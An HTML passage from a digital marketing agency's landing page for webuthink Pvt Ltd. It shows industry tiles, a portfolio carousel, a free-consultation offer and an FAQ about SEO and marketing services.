																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Startup
																							Business</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-heartbeat"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Healthcare &
																							Hospital</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-building-o"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Real Estate &
																							Constructor</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591944334616"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-graduation-cap"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Lawyers or
																							Attorney</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-car"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Tours & Travel</a>
																					</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-taxi"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Car Dealer /
																							Logistics</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-3">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_raw_code wpb_content_element wpb_raw_html">
																			<div class="wpb_wrapper">
																				<div class="industries_area invrt_clr"
																					data-colors="#ee7730,#15243A">
																					<div class="industries_img_area"
																						style="fill: #15243a;">
																						<div class="industries_main_img"
																							style="fill: #15243a;">
																							<figure
																								style="fill: #15243a;">
																								<i class="fa fa-hospital-o"
																									aria-hidden="true"></i>
																							</figure>
																						</div>
																					</div>
																					<p><a style="fill: #ee7730;"
																							href="#">Hotel and
																							Restaurant</a></p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div id="portfolio"
								class="vc_row wpb_row section vc_row-fluid  vc_custom_1592049557047 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div
																class="wpb_column vc_column_container vc_col-sm-12 vc_hidden-sm vc_hidden-xs">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #000000;">Web
																						Designing Portfolio</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1591945684216">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; font-size: 18px; font-weight: 600;">
																					<span
																						style="color: #29364a; text-transform: capitalize;">Leading
																						Web Designing Company |
																						Ecommerce Website Development
																						Delhi | PHP/MySQL | B2C Portal
																						Development Firm India</span>
																				</p>
																				<div id="gtx-trans"
																					style="position: absolute; left: 376px; top: 19.3333px;">
																					<div class="gtx-trans-icon"></div>
																				</div>

																			</div>
																		</div>
																		<div
																			class="qode-advanced-image-gallery  qode-aig-carousel-type qode-large-space   ">
																			<div class="qode-aig-slider qode-owl-slider"
																				data-number-of-items="3"
																				data-enable-loop="yes"
																				data-enable-autoplay="yes"
																				data-slider-speed="5000"
																				data-slider-speed-animation="600"
																				data-slider-padding="no"
																				data-enable-navigation="yes"
																				data-enable-pagination="yes">
																				<div class="qode-aig-image">
																					<img width="321" height="196" alt=""
																						data-srcset="./image/website-1.jpg"
																						data-src="./image/website-1.jpg"
																						data-sizes="(max-width: 321px) 100vw, 321px"
																						class="attachment-full size-full lazyload"
																						src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
																							width="321" height="196"
																							src="./image/website-1.jpg"
																							class="attachment-full size-full"
																							alt=""
																							srcset="./image/website-1.jpg"
																							sizes="(max-width: 321px) 100vw, 321px" /></noscript>
																					<span class="aig-gallery-hover">
																					</span>
																				</div>
																				<div class="qode-aig-image">
																					<img width="321" height="196" alt=""
																						data-srcset="./image/website-2.png"
																						data-src="./image/website-2.png"
																						data-sizes="(max-width: 321px) 100vw, 321px"
																						class="attachment-full size-full lazyload"
																						src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
																							width="321" height="196"
																							src="./image/website-2.png"
																							class="attachment-full size-full"
																							alt=""
																							srcset="./image/website-2.png"
																							sizes="(max-width: 321px) 100vw, 321px" /></noscript>
																					<span class="aig-gallery-hover">
																					</span>
																				</div>
																				<div class="qode-aig-image">
																					<img width="321" height="196" alt=""
																						data-srcset="./image/website-3.png"
																						data-src="./image/website-3.png"
																						data-sizes="(max-width: 321px) 100vw, 321px"
																						class="attachment-full size-full lazyload"
																						src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
																							width="321" height="196"
																							src="./image/website-3.png"
																							class="attachment-full size-full"
																							alt=""
																							srcset="./image/website-3.png"
																							sizes="(max-width: 321px) 100vw, 321px" /></noscript>
																					<span class="aig-gallery-hover">
																					</span>
																				</div>
																				<div class="qode-aig-image">
																					<img width="321" height="196" alt=""
																						data-srcset="./image/website-4.png"
																						data-src="./image/website-4.png"
																						data-sizes="(max-width: 321px) 100vw, 321px"
																						class="attachment-full size-full lazyload"
																						src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
																							width="321" height="196"
																							src="./image/website-4.png"
																							class="attachment-full size-full"
																							alt=""
																							srcset="./image/website-4.png"
																							sizes="(max-width: 321px) 100vw, 321px" /></noscript>
																					<span class="aig-gallery-hover">
																					</span>
																				</div>
																				<div class="qode-aig-image">
																					<img width="321" height="196" alt=""
																						data-srcset="./image/website-1.jpg"
																						data-src="./image/website-1.jpg"
																						data-sizes="(max-width: 321px) 100vw, 321px"
																						class="attachment-full size-full lazyload"
																						src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
																							width="321" height="196"
																							src="./image/website-1.jpg"
																							class="attachment-full size-full"
																							alt=""
																							srcset="./image/website-1.jpg"
																							sizes="(max-width: 321px) 100vw, 321px" /></noscript>
																					<span class="aig-gallery-hover">
																					</span>
																				</div>
																				<div class="qode-aig-image">
																					<img width="321" height="196" alt=""
																						data-srcset="./image/website-5.png"
																						data-src="./image/website-5.png"
																						data-sizes="(max-width: 321px) 100vw, 321px"
																						class="attachment-full size-full lazyload"
																						src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" /><noscript><img
																							width="321" height="196"
																							src="./image/website-5.png"
																							class="attachment-full size-full"
																							alt=""
																							srcset="./image/website-5.png"
																							sizes="(max-width: 321px) 100vw, 321px" /></noscript>
																					<span class="aig-gallery-hover">
																					</span>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="vc_row wpb_row section vc_row-fluid  vc_custom_1592391965658 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2 class="wow fadeInLeft animated"
																					style="text-align: center;"
																					data-wow-delay=".1s"><span
																						style="color: #ffffff;">Gain
																						Success with these Three
																						Steps</span></h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1592195720175">
																			<div class="wpb_wrapper">
																				<p style="text-align: center;"><span
																						style="color: #ffffff;">webuthink
																						Pvt Ltd is here to help you in
																						growing your businesses
																						virtually with these easy
																						steps.</span></p>

																			</div>
																		</div>
																		<div class="separator  normal   "
																			style="background-color: #5c5c5c;"></div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner  control-work-p-success vc_custom_1592032777927"
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title very_large custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/p-icon-1.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/p-icon-1.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Initiation</h4>
																					<p style='color: #ffffff'>Define the
																						objectives and goals of your
																						business so that we can work
																						accordingly</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title very_large custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/p-icon-2.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/p-icon-2.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Planning</h4>
																					<p style='color: #ffffff'>Set goals,
																						identify the deliverables, and
																						create a working process for the
																						projects</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-4">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class='q_icon_with_title very_large custom_icon_image center '>
																			<div class="icon_holder " ><img
																					itemprop="image"   alt=""
																					data-src="./image/p-icon-3.png"
																					class="lazyload"
																					src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																						itemprop="image"  
																						src="./image/p-icon-3.png"
																						alt=""></noscript></div>
																			<div class="icon_text_holder"  >
																				<div class="icon_text_inner"  >
																					<h4 class="icon_title"
																						style="color: #ffffff;font-weight: 600;">
																						Execution</h4>
																					<p style='color: #ffffff'>Track and
																						supervise the project for
																						producing the expected results
																					</p>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							
							<div id="Free" class="vc_row wpb_row section vc_row-fluid  vc_custom_1592391973898"
								style=' text-align:left;'>
								<div class=" full_section_inner clearfix">
									<div class="wpb_column vc_column_container vc_col-sm-12">
										<div class="vc_column-inner">
											<div class="wpb_wrapper">
												<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591950608806 grid_section"
													style=' text-align:center;'>
													<div class=" section_inner clearfix">
														<div class='section_inner_margin clearfix'>
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<h2
																					style="text-align: center; font-size: 40px; color: #fff; font-weight: bold;">
																					HERE IS OUR FREE 30 MINUTES
																					DEDICATED TO YOU!</h2>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; color: #dfdfdf; font-size: 18px; font-weight: 600; padding: 10px 0px;">
																					You can get in touch with our
																					digital marketing consultant and
																					plan online marketing and website
																					promotion strategies for your
																					business.</p>

																			</div>
																		</div>
																		<div
																			class="wpb_text_column wpb_content_element ">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; color: #dfdfdf; font-size: 18px; font-weight: 600; padding: 10px 0px;">
																					<span style="color: #ed8420;">WE
																						WILL DISCUSS….</span></p>

																			</div>
																		</div>
																		<div class="separator call-to-sepppp normal   "
																			style="background-color: #729abf;"></div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											
												<div class="vc_row wpb_row section vc_row-fluid vc_inner  vc_custom_1591950645037 grid_section"
													style=' text-align:center;'>
													<div class=" section_inner clearfix">
														<div class='section_inner_margin clearfix'>
															<div class="wpb_column vc_column_container vc_col-sm-12">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="wpb_text_column wpb_content_element  vc_custom_1591950636488">
																			<div class="wpb_wrapper">
																				<p
																					style="text-align: center; color: #dfdfdf; font-size: 18px; font-weight: 600; padding: 10px 0px;">
																					Results that amplify digital
																					marketing at optimal costs!</p>

																			</div>
																		</div> <a itemprop="url"
																			href="tel:+91-8285635636" target="_self"
																			data-hover-background-color='#29364a'
																			data-hover-border-color='#ed8420'
																			data-hover-color='#ffffff'
																			class="qbutton  big_large center default control-call-to-action-btnm"
																			style="color: #ffffff; border-color: #ed8420; background-color: #ed8420;">BOOK
																			YOUR CALL NOW !</a>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>











												<div class="vc_row wpb_row section vc_row-fluid vc_inner  grid_section"
												style=' text-align:left;'>
												<div class=" section_inner clearfix">
													<div class='section_inner_margin clearfix'>
														<div class="wpb_column vc_column_container vc_col-sm-4">
															<div class="vc_column-inner">
																<div class="wpb_wrapper">
																	<div
																		class='q_icon_with_title medium custom_icon_image '>
																		<div class="icon_holder " ><img
																				itemprop="image"   alt=""
																				data-src="./image/interview.png"
																				class="lazyload"
																				src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																					itemprop="image"  
																					src="./image/interview.png"
																					alt=""></noscript></div>
																		<div class="icon_text_holder"  >
																			<div class="icon_text_inner"  >
																				<h4 class="icon_title"
																					style="color: #ffffff;font-weight: 600;">
																					Get in Touch</h4>
																				<p style='color: #ffffff'>Talk to
																					our online marketing experts and
																					let them know what you want for
																					your business.</p>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<div class="wpb_column vc_column_container vc_col-sm-4">
															<div class="vc_column-inner">
																<div class="wpb_wrapper">
																	<div
																		class='q_icon_with_title medium custom_icon_image '>
																		<div class="icon_holder " ><img
																				itemprop="image"   alt=""
																				data-src="./image/planning-1.png"
																				class="lazyload"
																				src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																					itemprop="image"  
																					src="./image/planning-1.png"
																					alt=""></noscript></div>
																		<div class="icon_text_holder"  >
																			<div class="icon_text_inner"  >
																				<h4 class="icon_title"
																					style="color: #ffffff;font-weight: 600;">
																					Plan Strategies</h4>
																				<p style='color: #ffffff'>Plan
																					online marketing strategy and
																					various other strategies for the
																					success of your business.</p>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
														<div class="wpb_column vc_column_container vc_col-sm-4">
															<div class="vc_column-inner">
																<div class="wpb_wrapper">
																	<div
																		class='q_icon_with_title medium custom_icon_image '>
																		<div class="icon_holder " ><img
																				itemprop="image"   alt=""
																				data-src="./image/testing.png"
																				class="lazyload"
																				src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img
																					itemprop="image"  
																					src="./image/testing.png"
																					alt=""></noscript></div>
																		<div class="icon_text_holder"  >
																			<div class="icon_text_inner"  >
																				<h4 class="icon_title"
																					style="color: #ffffff;font-weight: 600;">
																					Implement</h4>
																				<p style='color: #ffffff'>Our
																					digital marketing professionals
																					will then implement the plans as
																					per the discussion.</p>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>


											
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="vc_row wpb_row section vc_row-fluid  control-faq-scc vc_custom_1592047597932 grid_section"
								style=' text-align:left;'>
								<div class=" section_inner clearfix">
									<div class='section_inner_margin clearfix'>
										<div class="wpb_column vc_column_container vc_col-sm-12">
											<div class="vc_column-inner">
												<div class="wpb_wrapper">
													<div
														class="wpb_text_column wpb_content_element  vc_custom_1592195930641">
														<div class="wpb_wrapper">
															<h2 class="hdm" style="text-align: center;">FAQs</h2>

														</div>
													</div>
													<div class="vc_row wpb_row section vc_row-fluid vc_inner "
														style=' text-align:left;'>
														<div class=" full_section_inner clearfix">
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						What is a digital marketing and
																						why is it important? </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								<strong>Digital
																									Marketing</strong>
																								is a type of online
																								marketing that includes
																								a wide range of services
																								such as SEO to social
																								media management, search
																								engine marketing, or
																								content marketing with
																								the potential for
																								reaching the thousands
																								of online users in our
																								growing technology
																								world.</p>
																							<ul>
																								<li
																									style="text-align: justify;">
																									Are essential and
																									highly recommended
																									to increase the
																									reach and awareness
																									of your business
																								</li>
																								<li
																									style="text-align: justify;">
																									Have the opportunity
																									to reach your target
																									and communicate with
																									them one-on-one</li>
																								<li
																									style="text-align: justify;">
																									Helps you develop
																									your company
																									digitally, produces
																									revenue and income
																									across growing
																									networks</li>
																							</ul>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						Which online Marketing services
																						are best for my business </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								Most businesses will
																								need essential services
																								such as
																								<strong>PPC</strong>,
																								<strong>SEO</strong>,
																								and <strong>website
																									design</strong>.
																								Further than that, the
																								services that are the
																								best for your business
																								depends on various
																								factors, such as budget,
																								goals, services/products
																								offered by you and your
																								intended audience.</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						What is the cost of your
																						marketing services </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p>I discovered <span
																									style="text-decoration: underline;">SEO
																									Experts India</span>
																								over the internet &amp;
																								with all the information
																								I found about them, they
																								seemed like a reliable
																								choice. In fact, after
																								looking at the
																								well-defined and
																								organized campaign,</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						What is your Reporting and
																						Communication Process </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								We produce monthly
																								updates and have
																								credibility for
																								responsiveness and
																								attention to detail.
																								During our discussion
																								call, we plan all the
																								strategies for your
																								business as per your
																								preference.</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						What is a full service digital
																						marketing agency </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								A full-service digital
																								marketing agency is one
																								that handles all facets
																								of an online presence
																								within a business. This
																								type of agency will have
																								various divisions
																								focused on one field,
																								such as a production
																								team, web development,
																								content creation, social
																								media management, SEO,
																								and SEM.</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
															<div class="wpb_column vc_column_container vc_col-sm-6">
																<div class="vc_column-inner">
																	<div class="wpb_wrapper">
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						How can I trust that you will
																						deliver high search ranking
																					</span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								webuthink Pvt Ltd is a
																								reputed <em><span
																										style="text-decoration: underline;"><strong>digital
																											marketing
																											company in
																											India</strong></span></em>
																								that has been featured
																								in the industry&#8217;s
																								top publications. We
																								have ranked with so many
																								businesses in Google and
																								other search engines.
																								Most of our new leads
																								are referred by our
																								past/existing clients.
																								This showcases the
																								quality of our digital
																								marketing work and its
																								effectiveness.</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						Have you ever worked for my
																						Industry </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p>webuthink Pvt Ltd is a
																								leading Indian digital
																								marketing agency. We are
																								in this business for
																								more than 7 years and
																								have successfully ranked
																								so many websites from
																								various industries. Our
																								clients range from
																								eCommerce to IT to
																								education to the retail
																								industry. We can create
																								personalized digital
																								marketing plans as per
																								your needs and industry.
																							</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						What are your online marketing
																						package charges and payment
																						terms </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								We charge our clients a
																								per-project basis.
																								Depending on the
																								complexity and the size
																								of a project, we can fix
																								a monthly fee as it is
																								more convenient for us
																								and the clients. You can
																								also choose a customized
																								digital marketing
																								package if that suits
																								your requirements. To
																								know more about the
																								exact charges and
																								payment terms, please
																								check our <span
																									style="text-decoration: underline;"><em>digital
																										marketing
																										pricing
																										packages</em></span>.
																							</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						Can you help me with local
																						search ranking </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								Our professional SEO
																								experts are adept at
																								<strong>local
																									SEO</strong>,
																								<strong>Google Maps
																									Marketing</strong>,
																								<strong>Paid Google Maps
																									advertising</strong>,
																								and <strong>small
																									business
																									SEO</strong>. We can
																								definitely help you with
																								local search ranking and
																								help you target any
																								particular city or area.
																							</p>

																						</div>
																					</div>
																				</div>
																			</div>
																		</div>
																		<div
																			class="qode-accordion-holder clearfix qode-toggle qode-initial ">
																			<h4 class="clearfix qode-title-holder">
																				<span class="qode-tab-title">
																					<span class="qode-tab-title-inner">
																						Why I should hire a digital
																						marketing company </span>
																				</span>
																				<span class="qode-accordion-mark">
																					<span
																						class="qode-accordion-mark-icon">
																						<span class="icon_plus"></span>
																						<span
																							class="icon_minus-06"></span>
																					</span>
																				</span>
																			</h4>
																			<div class="qode-accordion-content ">
																				<div
																					class="qode-accordion-content-inner">

																					<div
																						class="wpb_text_column wpb_content_element ">
																						<div class="wpb_wrapper">
																							<p
																								style="text-align: justify;">
																								Examine your business
																								objectives carefully and
																								<em><strong>hire a
																										digital
